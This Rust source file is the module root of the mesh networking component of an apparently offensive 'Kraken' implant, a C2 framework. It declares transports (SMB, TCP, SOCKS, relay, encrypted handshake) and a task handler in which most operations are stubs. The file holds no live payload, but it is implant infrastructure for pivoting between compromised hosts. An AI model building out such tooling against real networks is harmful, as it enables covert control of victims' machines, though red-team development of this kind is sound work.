//! Kraken mesh implant module
//!
//! Implements mesh peer-to-peer networking for implant nodes, including
//! X25519 key exchange handshake and session key derivation.

pub mod encrypted;
pub mod handshake;
pub mod keepalive;
pub mod relay;
pub mod smb;
pub mod socks;
pub mod tcp;

pub use encrypted::EncryptedConnection;
pub use handshake::{HandshakeResult, Transport, initiate_handshake, respond_handshake};
pub use keepalive::{KeepaliveConfig, LinkState, start_keepalive, stop_keepalive};
pub use relay::{MeshRelay, global_relay, init_global_relay, is_relay_initialized, try_global_relay};
pub use socks::{start_socks_server, SocksServer};

use common::{KrakenError, MeshOutput, MeshPeerInfo, MeshTopology, Module, ModuleId, TaskId, TaskResult};
use prost::Message;
use protocol::MeshTask;

// ---------------------------------------------------------------------------
// Module trait implementation for runtime loading
// ---------------------------------------------------------------------------

/// Mesh module for runtime loading
pub struct MeshModule {
    id: ModuleId,
}

impl MeshModule {
    pub fn new() -> Self {
        Self {
            id: ModuleId::new("mesh"),
        }
    }
}

impl Default for MeshModule {
    fn default() -> Self {
        Self::new()
    }
}

impl Module for MeshModule {
    fn id(&self) -> &ModuleId {
        &self.id
    }

    fn name(&self) -> &'static str {
        "Mesh"
    }

    fn version(&self) -> &'static str {
        env!("CARGO_PKG_VERSION")
    }

    fn handle(&self, _task_id: TaskId, task_data: &[u8]) -> Result<TaskResult, KrakenError> {
        let task: MeshTask = MeshTask::decode(task_data)
            .map_err(|e| KrakenError::Protocol(e.to_string()))?;

        let operation = task.operation
            .ok_or_else(|| KrakenError::Module("MeshTask missing operation".into()))?;

        let result = match operation {
            protocol::mesh_task::Operation::Connect(_connect) => {
                // Mesh connect handled by mesh_module.rs in implant-core for now
                // Full implementation requires mesh crate integration
                MeshOutput {
                    success: false,
                    peer_id: None,
                    topology: None,
                    message: None,
                    error: Some("mesh connect requires full mesh integration".into()),
                }
            }
            protocol::mesh_task::Operation::Disconnect(_disconnect) => {
                MeshOutput {
                    success: false,
                    peer_id: None,
                    topology: None,
                    message: None,
                    error: Some("mesh disconnect requires full mesh integration".into()),
                }
            }
            protocol::mesh_task::Operation::SetRole(_set_role) => {
                MeshOutput {
                    success: false,
                    peer_id: None,
                    topology: None,
                    message: None,
                    error: Some("mesh set_role requires full mesh integration".into()),
                }
            }
            protocol::mesh_task::Operation::GetTopology(_) => {
                // Return current topology from relay if initialized
                if let Some(relay) = try_global_relay() {
                    let peers: Vec<MeshPeerInfo> = relay
                        .links
                        .read()
                        .map(|links| {
                            links.values().map(|link| MeshPeerInfo {
                                peer_id: link.peer_id.as_bytes().to_vec(),
                                address: String::new(), // Address not stored in PeerLink
                                transport: format!("{:?}", link.transport),
                                state: format!("{:?}", link.state),
                                latency_ms: link.stats.latency_ms_avg,
                            }).collect()
                        })
                        .unwrap_or_default();
                    MeshOutput {
                        success: true,
                        peer_id: None,
                        topology: Some(MeshTopology { peers }),
                        message: None,
                        error: None,
                    }
                } else {
                    MeshOutput {
                        success: true,
                        peer_id: None,
                        topology: Some(MeshTopology { peers: vec![] }),
                        message: Some("mesh relay not initialized".into()),
                        error: None,
                    }
                }
            }
            protocol::mesh_task::Operation::Relay(_relay) => {
                MeshOutput {
                    success: false,
                    peer_id: None,
                    topology: None,
                    message: None,
                    error: Some("mesh relay requires full mesh integration".into()),
                }
            }
            protocol::mesh_task::Operation::Listen(_listen) => {
                MeshOutput {
                    success: false,
                    peer_id: None,
                    topology: None,
                    message: None,
                    error: Some("mesh listen requires full mesh integration".into()),
                }
            }
            protocol::mesh_task::Operation::SocksConnect(_) => {
                MeshOutput {
                    success: false,
                    peer_id: None,
                    topology: None,
                    message: None,
                    error: Some("socks connect handled by socks module".into()),
                }
            }
            protocol::mesh_task::Operation::SocksData(_) => {
                MeshOutput {
                    success: false,
                    peer_id: None,
                    topology: None,
                    message: None,
                    error: Some("socks data handled by socks module".into()),
                }
            }
        };

        Ok(TaskResult::Mesh(result))
    }
}

// For dynamic loading support
#[cfg(feature = "dynamic-entry")]
common::kraken_module_entry!(MeshModule);
